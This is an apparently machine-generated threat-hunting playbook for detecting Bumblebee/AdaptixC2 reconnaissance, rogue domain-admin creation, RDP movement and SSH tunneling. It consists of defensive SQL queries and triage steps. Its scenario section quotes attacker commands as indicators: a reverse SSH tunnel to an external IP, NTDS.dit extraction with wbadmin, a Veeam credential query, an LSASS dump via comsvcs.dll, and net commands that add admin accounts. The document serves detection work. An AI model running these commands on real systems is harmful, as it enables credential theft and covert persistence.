---
analysis: While single rules might alert on account creation, this hunt correlates
  that event with preceding domain discovery and subsequent RDP movement and SSH tunneling
  across three different telemetry surfaces.
blind_spots:
- id: domain-controller-logs-missing
  question: whether the rogue account logged into specific domain controllers
  requires: hb_auth_signin populated with Event ID 4624 from all DCs
  risk: Without DC logon visibility, lateral movement using newly created domain admins
    cannot be tracked.
  stage: lateral-movement-rdp
- id: ssh-tunnel-payload-blindness
  question: what commands were sent over the reverse SSH tunnel
  requires: Network proxy or SSL inspection of port 22/10400
  risk: Adversary actions inside an encrypted tunnel are hidden from network inspection.
  stage: persistence-and-tunneling
coverage:
- stage: discovery-host-and-domain
  status: covered
  steps:
  - discovery-activity
- stage: persistence-domain-account-creation
  status: covered
  steps:
  - account-persistence
- stage: lateral-movement-rdp
  status: covered
  steps:
  - rdp-lateral-movement
- stage: persistence-and-tunneling
  status: covered
  steps:
  - external-tunneling
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: initial-access-seo-poisoning
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: execution-malware-loading
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: command-and-control-bumblebee-adaptix
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: credential-access-ntds-dump
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: credential-access-postgre-lsass
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: exfiltration-sftp
  status: out_of_scope
- reason: 'Belongs to another part of the ''Flash Alert: From Bing Search to Ransomware:
    Bumblebee and AdaptixC2 Deliver Akira'' series.'
  stage: impact-akira-ransomware
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: keep-as-periodic-hunt
  justification: Establishment of rogue domain admins and external tunnels represents
    a critical path to environment compromise. A negative result confirms these persistence
    vectors are not active.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder is performing domain discovery and establishing privileged
  persistence by creating rogue administrator accounts and external SSH tunnels from
  compromised systems.
labels:
- hunt
- attack.t1082
- attack.t1087.002
- attack.t1069.002
- attack.t1136.002
- attack.t1021.001
- attack.t1133
- attack.t1572
name: Bumblebee Reconnaissance and Privileged Persistence
parameters:
  backup_account_names:
    default:
    - backup_DA
    - backup_EA
    description: Adversary-created privileged account names observed in the campaign.
    from:
      kind: article
      observed: '2025-08-05'
      ref: dfir-report-bumblebee-akira
    type: list[string]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  scope_hosts:
    default: []
    description: Limit analysis to specific hosts found during scoping; leave empty
      to scan all hosts.
    type: list[host]
  tunnel_ips:
    default:
    - 193.242.184.150
    - 83.229.17.60
    - 185.174.100.203
    description: Known external IPs used for SSH tunnels or exfiltration.
    from:
      kind: article
      observed: '2025-08-05'
      ref: dfir-report-bumblebee-akira
    type: list[ip]
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: The hunt begins by identifying hosts that installed software lures mentioned
  in the research. It then focuses on servers and domain controllers where privileged
  accounts would be most active.
references:
- name: "The DFIR Report \u2014 From Bing Search to Ransomware: Bumblebee and AdaptixC2\
    \ Deliver Akira"
  url: https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-2/
related:
- hunt: bumblebee-initial-access-seo
  reason: Initial access via SEO poisoning leads to the reconnaissance and persistence
    seen here.
  relation: precedes
- hunt: akira-ransomware-impact
  reason: Successful persistence and discovery are prerequisites for final ransomware
    deployment.
  relation: follows
- hunt: bumblebee-seo-poisoning-sideloading
  relation: follows
scenario:
  stages:
  - name: Initial Access via SEO Poisoning
    observables:
    - opmanager.pro
    - ManageEngine-OpManager.msi
    - angryipscanner.org
    - axiscamerastation.org
    - ip-scanner.org
    slug: initial-access-seo-poisoning
    tactic: initial-access
    techniques:
    - T1189
  - name: Bumblebee Loading and Execution
    observables:
    - msiexec.exe
    - consent.exe
    - msimg32.dll
    - 186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da
    - a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331
    slug: execution-malware-loading
    tactic: execution
    techniques:
    - T1574.002
    - T1204.002
  - name: Bumblebee and Adaptix C2
    observables:
    - 109.205.195.211
    - 188.40.187.145
    - 172.96.137.160
    - ev2sirbd269o5j.org
    - 2rxyt9urhq0bgj.org
    - AdgNsy.exe
    slug: command-and-control-bumblebee-adaptix
    tactic: command-and-control
    techniques:
    - T1071.001
    - T1568.002
  - name: Host and Domain Reconnaissance
    observables:
    - systeminfo
    - 'nltest /dclist:'
    - whoami /groups
    - net group "domain admins" /dom
    slug: discovery-host-and-domain
    tactic: discovery
    techniques:
    - T1082
    - T1087.002
    - T1069.002
  - name: Privileged Account Creation
    observables:
    - net user backup_DA
    - net user backup_EA
    - net group "Enterprise Administrators" backup_EA /add
    slug: persistence-domain-account-creation
    tactic: persistence
    techniques:
    - T1136.002
  - name: Lateral Movement via RDP
    observables:
    - backup_EA
    slug: lateral-movement-rdp
    tactic: lateral-movement
    techniques:
    - T1021.001
  - name: NTDS.dit Extraction
    observables:
    - wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:"C:\windows\NTDS\ntds.dit"
    - ntds.dit
    slug: credential-access-ntds-dump
    tactic: credential-access
    techniques:
    - T1003.003
  - name: Persistence and External Tunneling
    observables:
    - RustDesk
    - ssh root@193.242.184.150 -R *:10400
    - 83.229.17.60
    slug: persistence-and-tunneling
    tactic: persistence
    techniques:
    - T1133
    - T1572
  - name: Database and Memory Credential Theft
    observables:
    - psql.exe -U postgres -d VeeamBackup -c "SELECT user_name,password FROM credentials"
    - 'rundll32.exe C:\windows\System32\comsvcs.dll, #+000024'
    slug: credential-access-postgre-lsass
    tactic: credential-access
    techniques:
    - T1003.001
    - T1555
  - name: Data Exfiltration via FileZilla
    observables:
    - FileZilla
    - 185.174.100.203
    slug: exfiltration-sftp
    tactic: exfiltration
    techniques:
    - T1048.003
  - name: Akira Ransomware Deployment
    observables:
    - locker.exe
    - win.exe
    - de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d
    slug: impact-akira-ransomware
    tactic: impact
    techniques:
    - T1486
  summary: Threat actors utilized SEO poisoning for 'ManageEngine OpManager' to deliver
    Bumblebee malware, which dropped AdaptixC2 for post-exploitation. The intrusion
    involved domain account creation, NTDS.dit dumping via wbadmin, and lateral movement
    to a backup server before exfiltrating data and deploying Akira ransomware.
series:
  index: 2
  slug: flash-alert-from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira
  title: 'Flash Alert: From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver
    Akira'
  total: 3
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  identity:
    category: identity
    name: Identity / sign-in telemetry
    telemetry:
    - identity
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
tlp: clear
type: investigation
---


# Bumblebee Reconnaissance and Privileged Persistence

This hunt identifies the post-compromise activity of Bumblebee and AdaptixC2, focusing on the critical transition from initial access to full domain control. It examines host and domain reconnaissance command sequences, the creation of privileged backup accounts, and the subsequent use of these accounts for RDP lateral movement and external persistence via RustDesk or SSH tunnels. Following a phased approach, the hunt correlates discovery noise with high-fidelity persistence indicators to confirm a network-wide intrusion.

## scoping-lure-software
<!-- Identify hosts with lure software -->
Find systems where the malicious software installers were likely executed to scope the hunt.

```sqlite target=endpoint role=scoping
~~~yaml
expected: A list of hosts that have installed target software. These are likely initial
  beachheads.
reads:
- device_hostname
- package_name
- vendor_name
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT DISTINCT device_hostname FROM hb_software_inventory WHERE (LOWER(package_name) LIKE '%manageengine opmanager%' OR LOWER(package_name) LIKE '%axis camera%' OR LOWER(package_name) LIKE '%angry ip scanner%' OR LOWER(package_name) LIKE '%advanced ip scanner%')
```

## early-stage-parallel
<!-- Analyze early stage reconnaissance -->
parallel:
- → discovery-activity
- → account-persistence
join: → triage-early-stage

## discovery-activity
<!-- Host and domain reconnaissance -->
Find the specific sequence of discovery tools used to map domain admins and enterprise trust.

```sqlite target=endpoint role=triage params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
expected: Multiple discovery commands executed within a narrow window on a single
  host.
reads:
- device_hostname
- process_name
- process_cmd_line
- user_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_name, process_cmd_line, user_name, time FROM hb_process_activity WHERE (LOWER(process_name) LIKE '%\systeminfo.exe' OR LOWER(process_name) LIKE '%\nltest.exe' OR LOWER(process_name) LIKE '%\whoami.exe' OR LOWER(process_name) LIKE '%\net.exe' OR LOWER(process_name) LIKE '%\net1.exe') AND (LOWER(process_cmd_line) LIKE '%/groups%' OR LOWER(process_cmd_line) LIKE '%/dclist%' OR LOWER(process_cmd_line) LIKE '%domain admins%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## account-persistence
<!-- Privileged account creation -->
Find rare or suspicious account creations used for domain persistence.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days, scope_hosts=scope_hosts)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Commands creating privileged accounts that only appear on a single system.
prevalence:
  by: device_hostname
  key:
  - process_cmd_line
  rare_below: 3
reads:
- process_cmd_line
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_cmd_line, COUNT(DISTINCT device_hostname) AS host_count, MIN(time) AS first_seen FROM hb_process_activity WHERE (LOWER(process_name) LIKE '%\net.exe' OR LOWER(process_name) LIKE '%\net1.exe') AND (LOWER(process_cmd_line) LIKE '%/add%' OR LOWER(process_cmd_line) LIKE '%backup_%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY process_cmd_line, device_hostname HAVING host_count <= 2
```

## triage-early-stage
<!-- Triage discovery and accounts -->
```agent target=hunter
cite: required
context:
- discovery-activity
- account-persistence
max_iterations: 4
objective: Determine if discovery tools and net user modifications indicate an adversary
  establishing a foothold.
success_criteria: A list of suspicious hosts with associated malicious accounts.
tools:
- endpoint
- identity
- network
```

## follow-on-parallel
<!-- Analyze tunneling and movement -->
parallel:
- → external-tunneling
- → rdp-lateral-movement
join: → intrusion-correlation

## external-tunneling
<!-- SSH and RustDesk tunnels -->
Identify external persistence mechanisms, specifically reverse SSH tunnels or RustDesk connections.

```sqlite target=network role=enrichment params=(lookback_days=lookback_days, tunnel_ips=tunnel_ips)
~~~yaml
expected: Connections to known tunnel IPs or use of port 10400 for proxying.
reads:
- device_hostname
- process_name
- dst_endpoint_ip
- dst_endpoint_port
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_name, dst_endpoint_ip, dst_endpoint_port, time FROM hb_network_connection WHERE (LOWER(process_name) LIKE '%\ssh.exe' OR LOWER(process_name) LIKE '%\rustdesk.exe') AND (instr(',' || '{{tunnel_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0 OR dst_endpoint_port = 10400) AND time >= datetime('now', '-{{lookback_days}} days')
```

## rdp-lateral-movement
<!-- RDP movement using rogue accounts -->
Track lateral movement from beachheads to domain controllers using the new accounts.

```sqlite target=identity role=enrichment params=(lookback_days=lookback_days, backup_account_names=backup_account_names)
~~~yaml
expected: Logons by rogue accounts to domain controllers or critical internal servers.
reads:
- dst_endpoint_name
- src_endpoint_ip
- actor_user_name
- time
silence: not_evidence_of_absence
source: hb_auth_signin
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT dst_endpoint_name, src_endpoint_ip, actor_user_name, time FROM hb_auth_signin WHERE (instr(',' || '{{backup_account_names}}' || ',', ',' || actor_user_name || ',') > 0 OR actor_user_name LIKE 'backup_%') AND activity_id = 1 AND time >= datetime('now', '-{{lookback_days}} days')
```

## intrusion-correlation
<!-- Correlate full intrusion chain -->
```agent target=hunter
cite: required
context:
- triage-early-stage
- external-tunneling
- rdp-lateral-movement
max_iterations: 6
objective: Identify hosts and accounts involved in the full Bumblebee intrusion chain
  by connecting recon to privileged persistence and tunneling.
success_criteria: A final verdict of malicious for any host showing recon followed
  by account creation and lateral movement.
tools:
- endpoint
- identity
- network
```

## route-on-verdict
<!-- Route on verdict -->
if~: "the intrusion-correlation verdict is malicious for at least one host or account" (confidence: high, judge=hunter)
then: → isolate-compromised-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: domain-controller-logs-missing)
else: → close-out

## isolate-compromised-host
<!-- Isolate compromised host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the compromised beachhead host and any destination systems targeted by the rogue accounts. Disable identified backup_ accounts in Active Directory.
```
→ analyst-review

## analyst-review
<!-- Analyst review -->
```manual target=analyst
Review the correlated intrusion timeline. Confirm the source of the initial compromise on beachhead hosts and verify the status of rogue accounts.
```
→ close-out

## close-out
<!-- Close out -->
```manual target=analyst
Record what was examined, what was not visible, and whether to schedule a re-run of this phased hunt.
```
→ end
